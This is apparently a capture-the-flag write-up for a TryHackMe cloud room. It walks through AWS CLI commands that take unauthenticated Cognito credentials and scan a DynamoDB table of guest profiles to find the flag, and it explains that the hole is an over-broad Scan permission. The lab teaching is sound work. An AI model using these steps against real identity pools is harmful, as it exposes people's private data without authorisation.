# Day 3 - Complimentary
## Room: <https://tryhackme.com/room/hh-complimentary-05e0b604>

Hello Hackers!

Welcome to Day 3 of the TryHackMe Hacker Holidays 2026 writeups.

This is a cloud security challenge involving an AWS Cognito Identity Pool and a DynamoDB table.

The application provides unauthenticated AWS credentials to visitors. These credentials can be used to access the resort’s guest wellness data.

Looking through the application’s JavaScript reveals the Cognito Identity Pool ID and the DynamoDB table name:

> `us-east-1:836c0949-292d-485b-b532-52d5ca7bb688`

The instructions indicate that the application is using AWS in the `us-east-1` region.

We can request an identity from the Cognito Identity Pool:

```bash
aws cognito-identity get-id \
--identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688" \
--region "us-east-1"
```

The command returns an `IdentityId`:

```json
{
    "IdentityId": "us-east-1:4d571309-b0b3-c3d8-3974-9ff9ab40e6a8"
}
```

Next, request temporary AWS credentials for this identity:

```bash
aws cognito-identity get-credentials-for-identity \
--identity-id "us-east-1:4d571309-b0b3-c3d8-3974-9ff9ab40e6a8" \
--region "us-east-1"
```

The response contains an `AccessKeyId`, `SecretKey`, and `SessionToken`. These are temporary credentials, so they should be used immediately and should not be published in a writeup.

Configure the AWS CLI using the values returned by the command:

```bash
aws configure
```

Enter the temporary access key and secret key when prompted. The session token can be set separately:

```bash
export AWS_SESSION_TOKEN="YOUR_SESSION_TOKEN"
```

The table name can be found in the application:

> `complimentary-GuestWellnessProfiles`

Now scan the DynamoDB table:

```bash
aws dynamodb scan \
--table-name "complimentary-GuestWellnessProfiles" \
--region "us-east-1" \
> final.json
```

The scan returns the guest profiles stored in the table. Searching the output for `THM{` reveals the flag:

```bash
grep -o 'THM{[^}]*}' final.json
```

The vulnerability exists because the unauthenticated guest role is allowed to perform a full DynamoDB `Scan`, even though the application is only supposed to retrieve an individual guest profile.

Happy Hacking!
